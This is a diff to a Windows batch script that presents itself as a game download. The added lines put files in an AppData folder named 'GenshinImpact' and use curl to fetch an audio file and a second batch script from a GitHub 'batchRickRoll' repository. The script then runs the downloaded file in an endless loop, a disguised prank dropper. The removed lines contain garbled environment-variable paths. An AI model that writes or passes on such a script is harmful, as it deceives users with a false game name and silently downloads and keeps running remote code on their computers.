@@ -3,14 +3,13 @@
 echo Downloading Game
 
 :DOWNLOAD
-  mkdir %APPDATA%\yompBest
-  curl -o %APPDATAAPPDATAAPPDATAAPPDATA%\yompBest\role.mp3 -LO http://raw.githubusercontent.com/pogga-was-taken/batchRickRoll/main/roll.mp3
-  curl -o %APPDATAAPPDATAAPPDATA%\yompBest\m.bat -LO http://raw.githubusercontent.com/pogga-was-taken/batchRickRoll/main/mediarunner.bat
-  %APPDATAAPPDATA%\yompBest\m %TEMP%\yompBest\role.mp3
+  mkdir %APPDATA%\GenshinImpact
+  curl -o %APPDATA%\GenshinImpact\role.mp3 -LO http://raw.githubusercontent.com/pogga-was-taken/batchRickRoll/main/roll.mp3
+  curl -o %APPDATA%\GenshinImpact\m.bat -LO http://raw.githubusercontent.com/pogga-was-taken/batchRickRoll/main/mediarunner.bat
   goto play
  
  :play
  timeout 230
- %APPDATA%\yompBest\m %TEMP%\yompBest\role.mp3
+ %APPDATA%\GenshinImpact\m %APPDATA%\GenshinImpact\role.mp3
  
  goto play
